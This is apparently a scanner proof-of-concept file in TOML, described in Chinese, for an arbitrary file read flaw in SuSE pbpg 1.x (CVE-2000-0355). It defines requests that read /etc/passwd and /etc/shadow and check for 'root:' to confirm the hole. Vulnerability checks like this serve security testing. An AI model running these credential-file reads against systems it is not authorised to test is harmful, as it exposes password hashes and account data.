[info]
author = "AVE"
description = "通过 pg/pb 命令读取系统任意文件，验证 SuSE pbpg 1.x 权限绕过漏洞"
id = "POC-AVE-2000-0364"
name = "SuSE pbpg 1.x 任意文件读取漏洞 PoC"
severity = "high"
tags = ["ave-2000-0364"]
vuln_id = [
    "CVE-2000-0355",
    "AVE-2000-0364",
]

[poc]
logic = "any"

[[poc.requests]]
path = "/etc/passwd"
protocol = "file"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]

[[poc.requests]]
path = "/etc/shadow"
protocol = "file"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]
